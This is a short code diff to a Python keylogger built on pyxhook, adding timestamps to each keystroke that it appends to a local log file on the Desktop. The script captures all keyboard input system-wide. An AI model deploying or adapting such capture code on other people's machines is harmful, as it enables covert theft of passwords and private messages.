@@ -1,6 +1,6 @@
 import os
 import pyxhook
-
+import datetime
 #log file save location
 log_file = os.environ.get('psylogger_file',os.path.expanduser('~/Desktop/file.log'))
 
@@ -16,7 +16,7 @@ if os.environ.get('pylogger_clean', None) is not None:
 
 def OnKeyPress(event):
     with open(log_file, 'a') as f:
-        f.write('{}\n'.format(event.Key))
+        f.write('{} : {}\n'.format(datetime.datetime.now(), event.Key))
 
 new_hook = pyxhook.HookManager()
 new_hook.KeyDown = OnKeyPress
